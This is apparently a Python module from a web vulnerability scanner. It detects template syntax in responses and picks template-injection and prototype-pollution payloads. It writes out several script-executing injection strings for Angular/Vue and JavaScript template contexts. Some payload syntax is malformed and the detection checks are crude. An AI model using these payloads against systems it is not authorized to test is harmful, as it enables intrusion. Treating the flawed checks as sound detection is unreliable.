from core.payload_groups import template_context_payloads, prototype_pollution
from core.colors import *
from core.config import xsschecker

def detect_template_context(response):
    """Detect if the target is vulnerable to template injection"""
    signs = ['{{', '${', '{%', '<%']
    for sign in signs:
        if sign in response:
            return True
    return False

def get_template_payloads(response):
    """Return appropriate template injection payloads based on context"""
    payloads = []
    if '{{' in response:  # Angular/Vue.js style
        payloads.extend([p for p in template_context_payloads if '{{' in p])
    if '${' in response:  # JavaScript template literal style
        payloads.extend([p for p in template_context_payloads if '${' in p])
    return payloads

def check_prototype_pollution(response):
    """Check if prototype pollution might be effective"""
    signs = ['Object', 'prototype', '__proto__', 'constructor']
    for sign in signs:
        if sign in response:
            return True
    return False

def get_pollution_payloads():
    """Return prototype pollution payloads"""
    return prototype_pollution

def analyze_template_context(response):
    """Analyze the template context and return appropriate payloads"""
    result = {
        'is_template': False,
        'template_type': None,
        'payloads': []
    }
    
    if '{{' in response:
        result['is_template'] = True
        result['template_type'] = 'angular/vue/mustache'
        result['payloads'].extend([
            '{{constructor.constructor(\'alert(1)\')()}}',
            '{{_c.constructor(\'alert(1)\')()}}',
            '{{$el.ownerDocument.defaultView.alert(1)}}'
        ])
    
    elif '${' in response:
        result['is_template'] = True
        result['template_type'] = 'javascript'
        result['payloads'].extend([
            '${alert(1)}',
            '${eval(alert(1))}',
            '${this.constructor.constructor(\'alert(1)\')()}'
        ])
    
    elif '{%' in response:
        result['is_template'] = True
        result['template_type'] = 'twig/django/jinja'
        result['payloads'].extend([
            "{% debug %}",
            "{%% if 1 == 1 %%}{{7*7}}{% endif %}",
            "{%% for x in [1] %%}{{x}}{% endfor %}"
        ])
    
    return result
